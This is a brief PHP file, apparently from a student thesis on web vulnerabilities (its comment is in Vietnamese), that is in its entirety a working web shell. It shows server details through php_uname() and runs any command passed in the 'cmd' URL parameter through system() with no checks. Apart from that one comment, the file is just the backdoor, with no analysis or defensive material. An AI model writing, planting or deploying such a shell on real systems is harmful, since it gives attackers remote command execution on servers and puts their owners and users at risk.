<?php
// Báo cáo tóm tắt đề tài tốt nghiệp - Khảo sát lỗ hổng bảo mật
echo "<h1>Web Shell - Proof of Concept</h1>";
echo "<p>Server Info: " . php_uname() . "</p>";
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>

